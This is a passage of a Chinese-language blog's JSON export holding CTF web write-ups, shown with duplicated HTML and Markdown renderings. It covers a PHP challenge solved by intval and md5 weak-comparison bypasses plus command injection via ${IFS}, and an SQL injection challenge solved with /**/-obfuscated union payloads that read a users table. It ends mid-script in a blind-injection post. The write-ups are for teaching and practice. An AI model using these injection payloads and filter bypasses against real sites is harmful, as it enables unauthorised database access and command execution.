class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//get flag</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$get_flag</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!strstr(<span class=\"variable\">$get_flag</span>,<span class=\"string\">&quot; &quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$get_flag</span> = str_ireplace(<span class=\"string\">&quot;cat&quot;</span>, <span class=\"string\">&quot;wctf2020&quot;</span>, <span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">        system(<span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;快到非洲了&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>一关一关的<strong>bypass</strong>。</p>\n<p>第一关</p>\n<p>重点在<code>intval</code>函数，intval函数有个特性:</p>\n<blockquote>\n<p> 直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换</p>\n</blockquote>\n<p>这里需要num的值小于2020，加一后值大于2021，可以使用科学计数法方法绕过。构造payload<code>2e9</code>，遇到第一个函数转换时，因为是以2开头下一位是字符，会直接被截取为2；遇到第二个函数，因为使用了<code>$num + 1</code>会进行类型转换，2e9会先使用科学计数法计算出值并+1。</p>\n<p>第二关</p>\n<p>需要一个md5值，对这个值再次使用md5加密以后，使用<strong>弱类型</strong>比较，和原来的值相同。md5的一个弱类型比较绕过：</p>\n<blockquote>\n<p>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。</p>\n</blockquote>\n<p>使用脚本跑一下得到一个值：<code>0e215962017</code>。</p>\n<p>最后一层，是一个<code>system</code>函数执行，但是在之前有一些过滤</p>\n<ul>\n<li><code>strstr</code>函数匹配空格，可以使用${IFS}绕过（这个里面有更详细的：<a href=\"https://www.ghtwf01.cn/index.php/archives/273/\">命令执行漏洞利用及绕过方式总结</a>）</li>\n<li><code>str_ireplace</code>会吧cat替换成wctf2020，所以不能使用cat命令，可以用：more、less、od、tail等等绕过，上面的博客里也有写道。</li>\n</ul>\n<p>先使用ls查看下当前目录下的文件，发现一个名为<code>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code>读取得到flag。</p>\n<p>最终payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/fl4g.php?num=2e9&amp;md5=0e215962017&amp;get_flag=more$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>进入页面直接报错</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416103737.png\"></p>\n<p>试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容</p>\n<blockquote>\n<p>User-agent: *<br>Disallow: /fAke_f1agggg.php</p>\n</blockquote>\n<p>访问<code>fAke_f1agggg.php</code>并且抓包，在响应头里有提示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416105630.png\"></p>\n<p>访问<code>fl4g.php</code>才正式开始，源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">&quot;/img.jpg&quot;</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">header(<span class=\"string\">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__file__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//level 1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(intval(<span class=\"variable\">$num</span>) &lt; <span class=\"number\">2020</span> &amp;&amp; intval(<span class=\"variable\">$num</span> + <span class=\"number\">1</span>) &gt; <span class=\"number\">2021</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//level 2</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>]))&#123;</span><br><span class=\"line\">   <span class=\"variable\">$md5</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>];</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (<span class=\"variable\">$md5</span>==md5(<span class=\"variable\">$md5</span>))</span><br><span class=\"line\">       <span class=\"keyword\">echo</span> <span class=\"string\">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//get flag</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$get_flag</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!strstr(<span class=\"variable\">$get_flag</span>,<span class=\"string\">&quot; &quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$get_flag</span> = str_ireplace(<span class=\"string\">&quot;cat&quot;</span>, <span class=\"string\">&quot;wctf2020&quot;</span>, <span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">        system(<span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;快到非洲了&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>一关一关的<strong>bypass</strong>。</p>\n<p>第一关</p>\n<p>重点在<code>intval</code>函数，intval函数有个特性:</p>\n<blockquote>\n<p> 直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换</p>\n</blockquote>\n<p>这里需要num的值小于2020，加一后值大于2021，可以使用科学计数法方法绕过。构造payload<code>2e9</code>，遇到第一个函数转换时，因为是以2开头下一位是字符，会直接被截取为2；遇到第二个函数，因为使用了<code>$num + 1</code>会进行类型转换，2e9会先使用科学计数法计算出值并+1。</p>\n<p>第二关</p>\n<p>需要一个md5值，对这个值再次使用md5加密以后，使用<strong>弱类型</strong>比较，和原来的值相同。md5的一个弱类型比较绕过：</p>\n<blockquote>\n<p>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。</p>\n</blockquote>\n<p>使用脚本跑一下得到一个值：<code>0e215962017</code>。</p>\n<p>最后一层，是一个<code>system</code>函数执行，但是在之前有一些过滤</p>\n<ul>\n<li><code>strstr</code>函数匹配空格，可以使用${IFS}绕过（这个里面有更详细的：<a href=\"https://www.ghtwf01.cn/index.php/archives/273/\">命令执行漏洞利用及绕过方式总结</a>）</li>\n<li><code>str_ireplace</code>会吧cat替换成wctf2020，所以不能使用cat命令，可以用：more、less、od、tail等等绕过，上面的博客里也有写道。</li>\n</ul>\n<p>先使用ls查看下当前目录下的文件，发现一个名为<code>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code>读取得到flag。</p>\n<p>最终payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/fl4g.php?num=2e9&amp;md5=0e215962017&amp;get_flag=more$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>\n\n"},{"title":"SWPU2019 Web1","date":"2021-04-15T01:55:17.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160013.jpg","_content":"\n一个登陆界面，再看下url地址为login.php，确认了使用的是php\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091617.png)\n\n直接查看源码，在源码中找到了register.php。先注册一个进去看一看。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091705.png)\n\n是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号`'`试一试\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091924.png)\n\n广告详情中出现了数据库报错\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091959.png)猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是**字符型单引号闭合**。\n\n接下来是尝试过滤。我试出来的有空格（使用`/**/`绕过）、or，and（可以使用&&，||），同时or被过滤，就说明保存数据库表名的库**information_schema**没有办法查询，并且**orderby**也不能使用，需要使用其他办法获取表内容。\n\n测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 `LIMIT 0,1`需要闭合，所以最后添加了一个单引号\n\n```sql\n'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415092716.png)\n\n说明回显位是2和3。\n\n由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。~~这种没有办法查询表名的题目表名应该都不会设置太难~~\n\n测试的语句 \n\n```sql\n'/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n当测到`users`表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。\n\n首先讲解一波**无列名注入**。\n\n先来个正常表（flag）的查询\n\n![](D:\\DROPS\\CTF比赛题解\\BUUCTF\\Web\\[SWPU2019]Web1\\20210415094632.png)\n\n我们知道在sql语句查询的时候，可以给列名起别名形如\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094059.png)\n\n使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094238.png)\n\n所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094814.png)\n\n\n\n需要为子查询的结果再起一个别名（图中为`x`），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用`group_concat`函数输出自己构造的表名。\n\n所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。\n\n最终的payload：\n\n```sql\n'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n\n\n","source":"_posts/[SWPU2019]Web1.md","raw":"---\ntitle: SWPU2019 Web1\ndate: 2021-04-15 09:55:17\ncategories:\n- CTF\ntags:\n- sql注入\n- 无列名注入\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160013.jpg\n---\n\n一个登陆界面，再看下url地址为login.php，确认了使用的是php\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091617.png)\n\n直接查看源码，在源码中找到了register.php。先注册一个进去看一看。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091705.png)\n\n是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号`'`试一试\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091924.png)\n\n广告详情中出现了数据库报错\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091959.png)猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是**字符型单引号闭合**。\n\n接下来是尝试过滤。我试出来的有空格（使用`/**/`绕过）、or，and（可以使用&&，||），同时or被过滤，就说明保存数据库表名的库**information_schema**没有办法查询，并且**orderby**也不能使用，需要使用其他办法获取表内容。\n\n测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 `LIMIT 0,1`需要闭合，所以最后添加了一个单引号\n\n```sql\n'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415092716.png)\n\n说明回显位是2和3。\n\n由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。~~这种没有办法查询表名的题目表名应该都不会设置太难~~\n\n测试的语句 \n\n```sql\n'/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n当测到`users`表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。\n\n首先讲解一波**无列名注入**。\n\n先来个正常表（flag）的查询\n\n![](D:\\DROPS\\CTF比赛题解\\BUUCTF\\Web\\[SWPU2019]Web1\\20210415094632.png)\n\n我们知道在sql语句查询的时候，可以给列名起别名形如\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094059.png)\n\n使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094238.png)\n\n所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094814.png)\n\n\n\n需要为子查询的结果再起一个别名（图中为`x`），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用`group_concat`函数输出自己构造的表名。\n\n所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。\n\n最终的payload：\n\n```sql\n'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n\n\n","slug":"[SWPU2019]Web1","published":1,"updated":"2021-12-30T09:42:54.200Z","_id":"ckrr3f9b20012hotcf6k5a6y0","comments":1,"layout":"post","photos":[],"link":"","content":"<p>一个登陆界面，再看下url地址为login.php，确认了使用的是php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091617.png\"></p>\n<p>直接查看源码，在源码中找到了register.php。先注册一个进去看一看。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091705.png\"></p>\n<p>是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号<code>&#39;</code>试一试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091924.png\"></p>\n<p>广告详情中出现了数据库报错</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091959.png\">猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是<strong>字符型单引号闭合</strong>。</p>\n<p>接下来是尝试过滤。我试出来的有空格（使用<code>/**/</code>绕过）、or，and（可以使用&amp;&amp;，||），同时or被过滤，就说明保存数据库表名的库<strong>information_schema</strong>没有办法查询，并且<strong>orderby</strong>也不能使用，需要使用其他办法获取表内容。</p>\n<p>测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 <code>LIMIT 0,1</code>需要闭合，所以最后添加了一个单引号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415092716.png\"></p>\n<p>说明回显位是2和3。</p>\n<p>由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。<del>这种没有办法查询表名的题目表名应该都不会设置太难</del></p>\n<p>测试的语句 </p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>当测到<code>users</code>表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。</p>\n<p>首先讲解一波<strong>无列名注入</strong>。</p>\n<p>先来个正常表（flag）的查询</p>\n<p><img src=\"D:\\DROPS\\CTF比赛题解\\BUUCTF\\Web[SWPU2019]Web1\\20210415094632.png\"></p>\n<p>我们知道在sql语句查询的时候，可以给列名起别名形如</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094059.png\"></p>\n<p>使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094238.png\"></p>\n<p>所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094814.png\"></p>\n<p>需要为子查询的结果再起一个别名（图中为<code>x</code>），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用<code>group_concat</code>函数输出自己构造的表名。</p>\n<p>所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。</p>\n<p>最终的payload：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<p>一个登陆界面，再看下url地址为login.php，确认了使用的是php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091617.png\"></p>\n<p>直接查看源码，在源码中找到了register.php。先注册一个进去看一看。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091705.png\"></p>\n<p>是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号<code>&#39;</code>试一试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091924.png\"></p>\n<p>广告详情中出现了数据库报错</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415091959.png\">猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是<strong>字符型单引号闭合</strong>。</p>\n<p>接下来是尝试过滤。我试出来的有空格（使用<code>/**/</code>绕过）、or，and（可以使用&amp;&amp;，||），同时or被过滤，就说明保存数据库表名的库<strong>information_schema</strong>没有办法查询，并且<strong>orderby</strong>也不能使用，需要使用其他办法获取表内容。</p>\n<p>测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 <code>LIMIT 0,1</code>需要闭合，所以最后添加了一个单引号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415092716.png\"></p>\n<p>说明回显位是2和3。</p>\n<p>由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。<del>这种没有办法查询表名的题目表名应该都不会设置太难</del></p>\n<p>测试的语句 </p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>当测到<code>users</code>表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。</p>\n<p>首先讲解一波<strong>无列名注入</strong>。</p>\n<p>先来个正常表（flag）的查询</p>\n<p><img src=\"D:\\DROPS\\CTF比赛题解\\BUUCTF\\Web[SWPU2019]Web1\\20210415094632.png\"></p>\n<p>我们知道在sql语句查询的时候，可以给列名起别名形如</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094059.png\"></p>\n<p>使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094238.png\"></p>\n<p>所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210415094814.png\"></p>\n<p>需要为子查询的结果再起一个别名（图中为<code>x</code>），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用<code>group_concat</code>函数输出自己构造的表名。</p>\n<p>所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。</p>\n<p>最终的payload：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n"},{"title":"极客大挑战 2019 FinalSQL","date":"2021-04-18T11:11:51.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232228.png","_content":"\n还是同一场比赛的界面\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416224503.png)\n\n这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：**你可别被我逮住了，臭弟弟**，测试上面的序号，注意此时的url中有`?id=`猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个**数字型**注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。\n\n发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。\n\n贴出来自己的脚本：\n\n```python\n# codeing=utf-8\nimport requests\nimport time\n\nurl='http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id='\nresult=''\n\nfor x in range(1, 100):\n\thigh = 127\n\tlow = 